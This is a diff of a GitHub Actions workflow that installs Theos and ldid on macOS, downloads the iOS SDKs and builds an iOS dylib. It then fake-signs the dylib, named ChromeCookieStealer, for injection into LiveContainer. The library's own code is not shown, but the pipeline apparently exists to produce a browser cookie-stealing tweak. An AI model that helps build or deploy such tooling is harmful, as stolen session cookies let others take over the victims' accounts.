@@ -8,23 +8,34 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: macos-latest  # Der Gamechanger – alles native
 
     steps:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: Setup Theos (mit Toolchain & SDKs)
-        uses: Randomblock1/theos-action@v1
-        with:
-          orion: 'false'  # Kein Swift nötig → schneller & kleiner
+      - name: Install ldid (für Fake-Sign)
+        run: brew install ldid
+
+      - name: Install Theos
+        run: |
+          git clone https://github.com/theos/theos.git $HOME/theos
+          echo "THEOS=$HOME/theos" >> $GITHUB_ENV
+          echo "$HOME/theos/bin" >> $GITHUB_PATH
+
+      - name: Update Theos (vendor fix + latest)
+        run: $THEOS/bin/update-theos
+
+      - name: Download latest iOS SDKs
+        run: |
+          curl -L https://github.com/theos/sdks/tarball/master | tar -xz -C $THEOS/sdks --strip-components=1
 
       - name: Build dylib
         run: |
           make clean
           make
 
-      - name: Fake-Sign dylib (für LiveContainer/Sideload)
+      - name: Fake-Sign dylib (muss für Injection in LiveContainer)
         run: |
           ldid -S obj/ChromeCookieStealer.dylib
 
